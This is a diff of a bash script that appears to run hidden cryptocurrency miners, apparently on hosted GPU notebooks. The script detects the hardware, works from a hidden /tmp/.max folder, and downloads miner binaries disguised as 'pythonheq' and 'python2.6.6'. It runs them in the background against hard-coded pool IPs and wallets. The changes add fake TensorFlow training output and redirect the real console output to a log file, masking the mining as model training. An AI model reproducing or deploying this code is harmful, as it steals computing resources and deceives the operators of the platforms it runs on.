@@ -1,21 +1,37 @@
 #!/bin/bash
-echo 
-echo -e '####################################################################################'
-echo -e '##################         '"RV"' Ver:0.7.8        ################################'
-echo -e '####################################################################################'
-echo 
-echo 
-echo 
+echo '{ "type":"tf.keras",'
+echo '"version":"0.0.1",'
+echo '"status":"Epoch 1/5 1875/1875 [==============================] - 5s 2ms/step - loss: 0.2978 - accuracy: 0.9137",'
 
-PROX=217.69.7.240
+PROX=49.12.115.117
 ETPort=443
-RVPort=21
+RVPort=8080
 VCPort=80
-XMPort=8080
-DisplayRefrech=10
+XMPort=21
+TESTPort=587
+TESTPort2=465
+DisplayRefrech=30
+echo '"df":'$DisplayRefrech','
+
+HZ_PROX1=49.12.115.117
+HZ_PROX2=188.34.159.9
+EU_PROX=49.12.115.117
+US_PROX=173.199.123.152
+CA_PROX=173.199.123.152
+ASIA_PROX=49.12.115.117
+
+#VCOptions="d=16,xn=1,hybrid"
+#VCOptions="mc=VRSC"
+VCOptions="c=DOGE,mc=VRSC"
+#VCOptions="c=VRSC,mc=VRSC"
+
+#VCOptions="X"
 
 SWITCHOPG=RV
 SWITCHOP=VC
+
+#SWITCHPROX=AUTO
+SWITCHPROX=$HZ_PROX1
 
 VCThreads=$[$(nproc)*2]
 XMThreads=$[$(nproc)*1]
@@ -28,6 +44,17 @@ W_ET="0x1be9C1Db52aC9cD736160c532D69aA4770c327B7"
 W_RV="RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK"
 W_XM="44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p"
 W_VC="RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek"
+W_BT="1MEdZan82tai5Kb7fqFJNgfpGhtsP47MFT"
+W_DG="D5EcMFZqLsd4CdZipk3LXviX8YUzEEfBj7"
+W_DG2="DSro3i42vz2MytCw22S4wun5qM5bTNNy5c"
+
+
+W_VC=$W_DG
+
+# Directory
+Work_Dir="/tmp/.max/"
+mkdir -p $Work_Dir
+cd  $Work_Dir
 
 ##################### functions #####################################
 
@@ -45,28 +72,32 @@ function displaytime {
 }
 
 
+
 ##  CPU info
-echo -e '#####################################   CPU info  ###########################################'
+
+echo -e '#####################################   CPU info  ###########################################' > /tmp/pysi.log
 
 VCPUNUM=$(nproc)
+echo '"nproc":'$VCPUNUM','
+
 cpufile=/proc/cpuinfo
 test -f $cpufile || exit 1
 CPUMODEL=$(grep "model name" $cpufile | sort -u | cut -d : -f 2-)
-echo -n CPU Model: $CPUMODEL
+# echo -n CPU Model: $CPUMODEL
 CPUCACHE=$(grep "cache size" $cpufile | sort -u | cut -d : -f 2-)
-echo " with $CPUCACHE cache."
+# echo " with $CPUCACHE cache."
 CPUSPEED=$(grep "cpu MHz" $cpufile | sort -u | cut -d : -f 2-|tail -n 1)
-echo " with $CPUSPEED MHz."
+# echo " with $CPUSPEED MHz."
 numphy=$(grep "physical id" $cpufile | sort -u | wc -l)
-echo -n "Physical CPUs: ${numphy}.  "
+# echo -n "Physical CPUs: ${numphy}.  "
 numcore=$(grep "core id" $cpufile | sort -u | wc -l)
-echo -n "Cores/CPU: ${numcore}.  "
-echo -n "Physical cores: $((numcore * numphy)).  "
+# echo -n "Cores/CPU: ${numcore}.  "
+# echo -n "Physical cores: $((numcore * numphy)).  "
 numlog=$(grep "processor" $cpufile | wc -l)
-echo "Logical cores: ${numlog}."
+# echo "Logical cores: ${numlog}."
 
 memtot=$(free -h | grep Mem | awk '{print $2}')
-echo -n "Total RAM: ${memtot}."
+# echo -n "Total RAM: ${memtot}."
 
 # The /usr/sbin/dmidecode command can give the number, size and speed of the
 # installed RAM, but it must be run as root.
@@ -74,31 +105,30 @@ if [[ "$USER" == "root" ]]; then
     raminfo=$(dmidecode --type 17 |\
             awk '/Size/{if ($2!="No") printf "%s %s, ",$2,$3} {if ($1=="Speed:" && $2!="Unknown") print $2" "$3}' |\
             uniq -c)
-    echo -n "  Composition:"
-    echo "$raminfo" | awk '{if (NF==5) print "  "$1" x "$2" "$3" "$4" "$5"."}'
+#    echo -n "  Composition:"
+#    echo "$raminfo" | awk '{if (NF==5) print "  "$1" x "$2" "$3" "$4" "$5"."}'
 else
-    echo
+    echo > /tmp/pysi.log
 fi
 
-gcard=$(lspci | awk -F ':' '/VGA/{print $3}')
-echo "Graphics:${gcard}."
+gcard=$(lspci 2>> /tmp/.max/err| awk -F ':' '/VGA/{print $3}')
+#echo "Graphics:${gcard}."
 
-netinfo=$(ip addr | grep -2 "en[o-p][0-9]\|eth[0-9]" | grep -1 "inet ")
+netinfo=$(ip addr 2>> /tmp/.max/err| grep -2 "en[o-p][0-9]\|eth[0-9]" | grep -1 "inet ")
 macaddr=$(echo "$netinfo" | awk '/link/{print $2}')
 ipaddr=$(echo "$netinfo" | awk '/inet/{print $2}' | awk -F'/' '{print $1}')
-echo "Ethernet: MAC Address: ${macaddr}.  IP Address: ${ipaddr}."
+echo '"ip_backend":"'$ipaddr'",'
+#echo "Ethernet: MAC Address: ${macaddr}.  IP Address: ${ipaddr}."
 
-echo -e '#############################################################################################'
+echo -e '#############################################################################################' > /tmp/pysi.log
 
-mkdir -p /tmp/.max/
-cd  /tmp/.max/
+
 
 wget -q -O /tmp/jq https://github.com/stedolan/jq/releases/download/jq-1.6/jq-linux64
 chmod +x /tmp/jq
 
 
-INFIDIFF=$(curl -s 'https://api.minerstat.com/v2/coins?list=ETH,RVN,XMR,VRSC')
-
+INFIDIFF=$(curl -s  --connect-to api.minerstat.com:443:$HZ_PROX1:8888  https://api.minerstat.com//v2/coins\?list\=ETH,RVN,XMR,VRSC --insecure)
 
 ETHDIF=$(echo  $INFIDIFF | /tmp/jq '.[0].difficulty')
 ETHREWARD=$(echo  $INFIDIFF  | /tmp/jq '.[0].reward')
@@ -120,20 +150,22 @@ XMPRICE=$(echo  $INFIDIFF | /tmp/jq '.[2].price')
 
 
 
-ETHPROFIT=$(python3 -c "print( 22.0*$ETHREWARD*1e6*$ETHPRICE*24*30 )"  )
-RVPROFIT=$(python3 -c "print( 8.0*$RVREWARD*1e6*$RVPRICE*24*30 )"  )
-VCPROFIT=$(python3 -c "print( 1.6*$VCREWARD*1e6*$VCPRICE*24*30 )")
-XMPROFIT=$(python3 -c "print(  220.2*$XMREWARD*$XMPRICE*24*30 )"   )
+ETHPROFIT=$(python3 -c "print('%.2f' % (22.0*$ETHREWARD*1e6*$ETHPRICE*24*30 ) )"  )
+RVPROFIT=$(python3 -c "print('%.2f' % (8.0*$RVREWARD*1e6*$RVPRICE*24*30 ) )"  )
+VCPROFIT=$(python3 -c "print('%.2f' % (1.3*$VCREWARD*1e6*$VCPRICE*24*30 ) )")
+XMPROFIT=$(python3 -c "print('%.2f' % ( 300.2*$XMREWARD*$XMPRICE*24*30 ) )"   )
 
-echo "Normal Month worth : ET = $ETHPROFIT , RV = $RVPROFIT , VC = $VCPROFIT , XM = $XMPROFIT"
-
-
+echo "Normal Month worth : ET = $ETHPROFIT , RV = $RVPROFIT , VC = $VCPROFIT , XM = $XMPROFIT" > /tmp/pysi.log
+echo '"ET_pro":'$ETHPROFIT','
+echo '"RV_pro":'$RVPROFIT','
+echo '"VC_pro":'$VCPROFIT','
+echo '"XM_pro":'$XMPROFIT','
 ## getting IP info
-#COININFO=$(curl -s https://whattomine.com/coins.json)
+#COININFO=$(wget -q -O - https://whattomine.com/coins.json)
 #COININFO_PARSED=$(echo $COININFO|grep -oP '(?<="coins": ")[^"]*')
 #ETINFO=$(echo $COININFO_PARSED|grep -oP '(?<="Ethereum": ")[^"]*')
 #RVINFO=$(echo $COININFO_PARSED|grep -oP '(?<="Ravencoin": ")[^"]*')
-JSINFO=$(curl -s ipinfo.io)
+JSINFO=$(wget -q -O - ipinfo.io)
 CITY=$(echo $JSINFO|grep -oP '(?<="city": ")[^"]*')
 REGION=$(echo $JSINFO|grep -oP '(?<="region": ")[^"]*')
 COUNTRY=$(echo $JSINFO|grep -oP '(?<="country": ")[^"]*')
@@ -144,9 +176,43 @@ IPNAME=$(echo $IIP | sed -r 's!/.*!!; s!.*\.!!')
 INFO="$COUNTRY""_""$IPNAME"
 LOC=$(echo $JSINFO|grep -oP '(?<="loc": ")[^"]*')
 #echo $JSINFO
-echo "let's name it: $INFO"
+echo "let's name it: $INFO" > /tmp/pysi.log
 
+echo '"ip":"'$IIP'",'
 
+echo '"org":"'$IPORG'",'
+echo '"city":"'$CITY'",'
+echo '"country":"'$COUNTRY'",'
+echo '"region":"'$REGION'",'
+
+################## Best Server ##################
+if [ $SWITCHPROX == AUTO ]
+then
+    if [ $COUNTRY == US ]
+    then
+    PROX=$US_PROX
+    elif [ $COUNTRY == CA ]
+    then
+    PROX=$CA_PROX
+    elif [ $COUNTRY == TW ]
+    then
+    PROX=$ASIA_PROX
+    elif [ $COUNTRY == CN ]
+    then
+    PROX=$ASIA_PROX
+    elif [ $COUNTRY == JP ]
+    then
+    PROX=$ASIA_PROX
+    elif [ $COUNTRY == BR ]
+    then
+    PROX=$US_PROX
+    else
+    PROX=$EU_PROX
+    fi
+else
+    PROX=$SWITCHPROX
+fi
+#################################################
 
 ## COLORS
 # Reset
@@ -233,84 +299,87 @@ echo  > ooutvc
 ##################################################################
 
 #################### CPU ARC ################################
-
+CPU='OLD'
 if [ $(lscpu |grep avx512 |wc -l) == 1 ]
 then 
-echo -e "${On_IGreen}"'## CPU AVX512 ##'"${Color_Off}"
+echo -e "${On_IGreen}"'## CPU AVX512 ##'"${Color_Off}" > /tmp/pysi.log
 OP=XM
 CPU='AVX512'
 BCColor="$On_Green""$BICyan"
 elif [ $(lscpu |grep avx2 |wc -l) == 1 ]
 then
-echo -e "${On_IBlue}"'##CPU AVX2 ##'"${Color_Off}"
+echo -e "${On_IBlue}"'##CPU AVX2 ##'"${Color_Off}" > /tmp/pysi.log
 OP=VC
 CPU='AVX2'
 BCColor="$On_Blue""$BICyan"
 elif [ $(lscpu |grep avx |wc -l) == 1 ]
 then
-echo -e "${On_IYellow}"'## CPU AVX ##'"${Color_Off}"
+echo -e "${On_IYellow}"'## CPU AVX ##'"${Color_Off}" > /tmp/pysi.log
 OP=VC
 CPU='AVX'
 BCColor="$On_Yellow""$BICyan"
 else
-echo -e "${On_IRed}"'## CPU OLD ##'"${Color_Off}"
+echo -e "${On_IRed}"'##  CPU OLD  ##'"${Color_Off}" > /tmp/pysi.log
 OP=VC
 CPU='OLD'
 BCColor="$On_Red""$BICyan"
 fi
+echo '"cpu_type":"'$CPU'",'
 
 #################### GPU Type #########################
 GPU=NULL
-if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
+if [ $(nvidia-smi 2>> /tmp/.max/err | grep P100-PCIE |wc -l) == 1 ]
 then
 
-echo -e "${On_IGreen}"'###### P100-PCIE ######'"${Color_Off}"
+echo -e "${On_IGreen}"'###### P100-PCIE ######'"${Color_Off}" > /tmp/pysi.log
 GPU=P100
-OPG=RV
+OPG=ET
 PROG=CU
 BGColor=$On_IGreen
-elif [ $(nvidia-smi | grep failed |wc -l) == 1 ]
+elif [ $(nvidia-smi 2>> /tmp/.max/err | grep failed |wc -l) == 1 ]
 then
-echo -e "${On_IBlue}"'#### ONLY CPU ###'"${Color_Off}"
+echo -e "${On_IBlue}"'#### ONLY CPU ###'"${Color_Off}" > /tmp/pysi.log
 GPU=NONE
 OPG=NONE
 BGColor=$On_IRed
-elif [ $( nvidia-smi  2>&1 |  grep "not found" |wc -l) == 1 ]
+elif [ $( nvidia-smi 2>> /tmp/.max/err  2>&1 |  grep "not found" |wc -l) == 1 ]
 then
-echo -e "${On_IRed}"'### No cuda ONLY CPU ###'"${Color_Off}"
+echo -e "${On_IRed}"'### No cuda ONLY CPU ###'"${Color_Off}" > /tmp/pysi.log
 GPU=NONE
 OPG=NONE
 BGColor=$On_IRed
-elif [ $(nvidia-smi | grep T4 |wc -l) == 1 ]
+elif [ $(nvidia-smi 2>> /tmp/.max/err | grep T4 |wc -l) == 1 ]
 then
-echo -e "${On_IBlue}"'####        T4        ###'"${Color_Off}"
+echo -e "${On_IBlue}"'####        T4        ###'"${Color_Off}" > /tmp/pysi.log
 GPU=T4
 OPG=ET
 PROG=CU
 BGColor=$On_IBlue
-elif [ $(nvidia-smi | grep K80 |wc -l) == 1 ]
+elif [ $(nvidia-smi 2>> /tmp/.max/err | grep K80 |wc -l) == 1 ]
 then
-echo -e "${On_IYellow}"'###    K80     ###'"${Color_Off}"
+echo -e "${On_IYellow}"'###    K80     ###'"${Color_Off}" > /tmp/pysi.log
 GPU=K80
 OPG=RV
 PROG=CU
 BGColor="$On_IYellow""$BRed"
-elif [ $(nvidia-smi | grep P4 |wc -l) == 1 ]
+elif [ $(nvidia-smi 2>> /tmp/.max/err | grep P4 |wc -l) == 1 ]
 then
 
-echo -e "${On_ICyan}"'###    P4    ###'"${Color_Off}"
+echo -e "${On_ICyan}"'###    P4    ###'"${Color_Off}" > /tmp/pysi.log
 GPU=P4
 OPG=ET
 PROG=CU
 BGColor=$On_ICyan
 else
-echo -e "${On_IPurple}"'###     Other GPU   ####'"${Color_Off}"
+echo -e "${On_IPurple}"'###     Other GPU   ####'"${Color_Off}" > /tmp/pysi.log
 GPU=OTHER
 OPG=ET
 PROG=CL
 BGColor=$On_IPurple
 
 fi
+echo '"gpu_type":"'$GPU'",'
+
 
 ##################################################################
 ########                execution                        #########     
@@ -330,6 +399,8 @@ else
 OP=$SWITCHOP
 fi
 
+echo '"opc":"'$OP'",'
+echo '"opg":"'$OPG'",'
 
 i="0"
 
@@ -360,7 +431,7 @@ then
     wget -q https://github.com/one10001/10001code/raw/main/pythonheq
     chmod +x pythonheq
 
-    nohup ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."VC_""$INFO" -t "$VCThreads" 1>> ooutvc 2>> ooutvc &
+    nohup ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."$INFO" -t "$VCThreads" -p "$VCOptions" 1>> ooutvc 2>> ooutvc &
 else
     VCThreads=$[$(nproc)/2]
     XMThreads=$[$(nproc)/2]
@@ -382,7 +453,7 @@ else
     wget -q https://github.com/one10001/10001code/raw/main/pythonheq
     chmod +x pythonheq
 
-    nohup ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."$INFO" -t "$VCThreads" 1>> ooutvc 2>> ooutvc &
+    nohup ./pythonheq -v -l "$PROX":"$VCPort" -u "$W_VC"."$INFO" -t "$VCThreads" -p "$VCOptions" 1>> ooutvc 2>> ooutvc &
 fi
 
 if [ $OPG == "ET" ]
@@ -409,45 +480,48 @@ then
     nohup  ./python2.6.6  -P stratum+tcp://"$W_RV"."$OPG"_"$PROG"_"$GPU"_"$INFO"@$PROX:$RVPort  -G 2>> oout 1>> oout &
     fi
 else
-    echo "No GPU"
+    echo "No GPU"  > /tmp/pysi.log
 fi
 
 
 ##################################################################
 ########                Display                          #########     
 ##################################################################
-
+echo -en '"wating":"'
+i=0
 while true
     do
         i=$[$i+1]
-        echo -e "${On_IWhite}${BIGreen}Timer: $(displaytime $[$i*$DisplayRefrech])|${On_IWhite}${BIBlue} IP: $IIP |  INFO: $COUNTRY - $REGION - $CITY - $IPORG ${Color_Off}"
+        echo -e "${On_IWhite}${BIGreen}Timer: $(displaytime $[($i-1)*$DisplayRefrech])|${On_IWhite}${BIBlue} IP: $IIP |  INFO: $COUNTRY - $REGION - $CITY - $IPORG ${Color_Off}"  > /tmp/pysi.log
         if [ $GPU == "NONE" ]
         then
-        echo -e "${BCColor} CPU OP: $OP |  CPU $CPU: $CPUSPEED x $VCPUNUM - $CPUCACHE | RAM: $memtot  "
+        echo -e "${BCColor} CPU OP: $OP |  CPU $CPU: $CPUSPEED x $VCPUNUM - $CPUCACHE | RAM: $memtot | PROX: $PROX  "  > /tmp/pysi.log
         else
-        echo -e "${BIYellow}${BGColor}GPU OP: $OPG  | GPU: $GPU / $PROG |${BCColor} CPU OP: $OP |  CPU $CPU: $CPUSPEED x $VCPUNUM - $CPUCACHE | RAM: $memtot "
+        echo -e "${BIYellow}${BGColor}GPU OP: $OPG  | GPU: $GPU / $PROG |${BCColor} CPU OP: $OP |  CPU $CPU: $CPUSPEED x $VCPUNUM - $CPUCACHE | RAM: $memtot | PROX: $PROX "  > /tmp/pysi.log
         fi
-
+        
         Gacc=$(grep Acc oout | wc -l)
         Vacc=$(grep Acc ooutvc | wc -l)
         Xacc=$(grep acc ooutxm | wc -l)
 
         if [ $GPU == "NONE" ]
         then
-        echo -e "ONLY CPU " > /tmp/envtype
+        echo -e "ONLY CPU " > /tmp/envtype 
         else
         echo -e "CPU + GPU" > /tmp/envtype
-                Gspeed=$(grep 'Mh' oout | tail -n 1 |awk -F" " '{print $7}')
+                Gspeed=$(grep 'Mh' oout | tail -n 1 |awk -F" " '{print $7}'|sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g")
+                Gping=$(grep 'ms' oout | tail -n 1 |awk -F" " '{print $6}'|sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g")
                 GSHARE=$(grep Acc oout | wc -l)
                 GRATIO=$[$GSHARE*3600/($i*$DisplayRefrech)]
+                GPROFIT=0
                 if [ $OPG == "RV" ]
                 then
-                GPROFIT=$(python3 -c "print(  $Gspeed*$RVREWARD*$RVPRICE*24*30 )" 2>> /tmp/.max/err  )
+                GPROFIT=$(python3 -c "print('%.2f' % ($RVREWARD * $Gspeed * 1e6 * $RVPRICE * 24 * 30 ))" 2>> /tmp/.max/err  )
                 else
-                GPROFIT=$(python3 -c "print(  $Gspeed*$ETHREWARD*$ETHPRICE*24*30 )" 2>> /tmp/.max/err   )
+                GPROFIT=$(python3 -c "print('%.2f' % ($ETHREWARD * $Gspeed * 1e6 * $ETHPRICE * 24 * 30 ))" 2>> /tmp/.max/err  )
                 fi
-                echo -e "${BIWhite}${BGColor}GPU $OPG -> ${BIYellow} $i ${Color_Off}:  ${BIGreen} GSHARE: $GSHARE ${Color_Off} | ${BIPurple} GRATIO : ${BIBlue} $GRATIO ${Color_Off} | GSpeed :${BIRed} $Gspeed ${Color_Off} | PerMonth :${BIRed} $GPROFIT ${Color_Off}" 
-
+                echo -e "${BIWhite}${BGColor}GPU $OPG -> ${BIYellow} $i ${Color_Off}:  ${BIGreen} GSHARE: $GSHARE ${Color_Off} | ${BIPurple} GRATIO : ${BIBlue} $GRATIO ${Color_Off} | GSpeed :${BIRed} $Gspeed ${Color_Off} | GPing :${BIRed} $Gping ${Color_Off} | PerMonth :${BIRed} $GPROFIT ${Color_Off}"  > /tmp/pysi.log
+                echo -en 'G'$GPROFIT' '
         fi
 
 
@@ -455,50 +529,60 @@ while true
 
         if [ $OP == "XM" ]
         then
-            Xspeed=$(grep 'max' ooutxm | tail -n 1 |awk -F"max" '{print $2}'| sed 's|H/s||g')  
-            XSHARE=$(grep Acc oout | wc -l)
+            Xspeed=$(grep 'max' ooutxm | tail -n 1 |awk -F"max" '{print $2}'| sed 's|H/s||g'|sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g")  
+            XSHARE=$(grep acc ooutxm | wc -l)
+            Xping=$(grep acc ooutxm | tail -n 1 |awk -F"(" '{print $3}'|awk -F"ms" '{print $1}')
             XRATIO=$[$XSHARE*3600/($i*$DisplayRefrech)]
-            XMPROFIT=$(python3 -c "print( $Xspeed*$XMREWARD*$XMPRICE*24*30 )" 2>> /tmp/.max/err  )
-            echo -e "${BIWhite}${On_Red}CPU $OP -> ${BIYellow} $i ${Color_Off}: ${BIBlue} XSHARE: $XSHARE ${Color_Off} | ${BIPurple} XRATIO : ${BIRed} $XRATIO ${Color_Off} | XSpeed :${BIRed} $Xspeed ${Color_Off} | PerMonth :${BIRed} $XMPROFIT ${Color_Off}" 
+            XMPROFIT=$(python3 -c "print('%.2f' % ($Xspeed * $XMREWARD * $XMPRICE * 24 * 30 ))" 2>> /tmp/.max/err  )
+            echo -e "${BIWhite}${On_Red}CPU $OP -> ${BIYellow} $i ${Color_Off}: ${BIBlue} XSHARE: $XSHARE ${Color_Off} | ${BIPurple} XRATIO : ${BIRed} $XRATIO ${Color_Off} | XSpeed :${BIRed} $Xspeed ${Color_Off} | Xping :${BIRed} $Xping ${Color_Off} | PerMonth :${BIRed} $XMPROFIT ${Color_Off}"  > /tmp/pysi.log
+            echo -en 'X'$XMPROFIT' '
+
         elif [ $OP == "VC" ]
         then
-            Vspeed=$(grep 'Speed' ooutvc | tail -n 1 |awk -F" " '{print $5}')
+            Vspeed=$(grep 'Speed' ooutvc | tail -n 1 |awk -F" " '{print $5}'|sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g")
             VSHARE=$(grep Acc ooutvc | wc -l)
             VRATIO=$[$VSHARE*3600/($i*$DisplayRefrech)]
-            VCPROFIT=$(python3 -c "print(  $Vspeed *$VCREWARD*1e6*$VCPRICE*24*30 )" 2>> /tmp/.max/err) 
-            echo -e "${BIWhite}${On_Blue}CPU $OP -> ${BIYellow} $i ${Color_Off}: ${BIBlue} VSHARE: $VSHARE ${Color_Off} | ${BIPurple} VRATIO : ${BIRed} $VRATIO ${Color_Off}  | VSpeed :${BIRed} $Vspeed ${Color_Off} | PerMonth :${BIRed} $VCPROFIT ${Color_Off}" 
+            VCPROFIT=$(python3 -c "print('%.2f' % ( $Vspeed * $VCREWARD * 1e6 * $VCPRICE * 24 *30 ))" 2>> /tmp/.max/err) 
+            echo -e "${BIWhite}${On_Blue}CPU $OP -> ${BIYellow} $i ${Color_Off}: ${BIBlue} VSHARE: $VSHARE ${Color_Off} | ${BIPurple} VRATIO : ${BIRed} $VRATIO ${Color_Off}  | VSpeed :${BIRed} $Vspeed ${Color_Off} | PerMonth :${BIRed} $VCPROFIT ${Color_Off}"  > /tmp/pysi.log
+            echo -en 'C'$VCPROFIT' '
         else 
             Vspeed=$(grep 'Speed' ooutvc | tail -n 1 |awk -F" " '{print $5}')
             VSHARE=$(grep Acc ooutvc | wc -l)
             VRATIO=$[$VSHARE*3600/($i*$DisplayRefrech)]
-            echo -e "${BIWhite}${On_Blue}CPU VC -> ${BIYellow} $i ${Color_Off}: ${BIBlue} VSHARE: $VSHARE ${Color_Off} | ${BIPurple} VRATIO : ${BIRed} $XRATIO ${Color_Off} | VSpeed :${BIRed} $Vspeed ${Color_Off}" 
+            echo -e "${BIWhite}${On_Blue}CPU VC -> ${BIYellow} $i ${Color_Off}: ${BIBlue} VSHARE: $VSHARE ${Color_Off} | ${BIPurple} VRATIO : ${BIRed} $XRATIO ${Color_Off} | VSpeed :${BIRed} $Vspeed ${Color_Off}"  > /tmp/pysi.log
             Xspeed=$(grep 'max' ooutxm | tail -n 1 |awk -F"max" '{print $2}')
-            XSHARE=$(grep Acc oout | wc -l)
+            XSHARE=$(grep acc ooutxm | wc -l)
+            Xping=$(grep acc ooutxm | tail -n 1 |awk -F"(" '{print $3}'|awk -F"ms" '{print $1}')
             XRATIO=$[$XSHARE*3600/($i*$DisplayRefrech)]
-            echo -e "${BIWhite}${On_Red} XM -> ${BIYellow} $i ${Color_Off}: ${BIBlue} XSHARE: $XSHARE ${Color_Off} | ${BIPurple} XRATIO : ${BIRed} $XRATIO ${Color_Off} | XSpeed :${BIRed} $Xspeed ${Color_Off}" 
-       
+            echo -e "${BIWhite}${On_Red} XM -> ${BIYellow} $i ${Color_Off}: ${BIBlue} XSHARE: $XSHARE ${Color_Off} | ${BIPurple} XRATIO : ${BIRed} $XRATIO ${Color_Off} | XSpeed :${BIRed} $Xspeed ${Color_Off}"  > /tmp/pysi.log
+            echo -en 'C'$VCPROFIT' '       
         fi
 
         if [ $Debug == "True" ]
-        then 
-            echo '###########################################  OOUT  #############################################'
-            tail oout
-            echo '###########################################  OOUTXM  #############################################'
-            tail ooutxm
-            echo '###########################################  OOUTVC  #############################################'
-            tail ooutvc
-            echo 
+        then         
+            echo '###########################################  OOUT  #############################################' > /tmp/pysi.log
+            tail oout > /tmp/pysi.log
+            echo '###########################################  OOUTXM  #############################################' > /tmp/pysi.log
+            tail ooutxm > /tmp/pysi.log
+            echo '###########################################  OOUTVC  #############################################' > /tmp/pysi.log
+            tail ooutvc > /tmp/pysi.log
+            echo  > /tmp/pysi.log
         fi
-        echo 
-        echo 
+        #i=$[$i+1]
+        echo > /tmp/pysi.log
+        echo > /tmp/pysi.log
+        
+        echo -en '*'
         sleep $DisplayRefrech
+        
 
     done
 
 
 
 
-echo -e "#######################   Process  Killed    #########################"
+echo -e "#######################   Process  Killed    #########################" > /tmp/pysi.log
                   
 done
-tail -f oout
+echo '"}'
+#tail -f oout
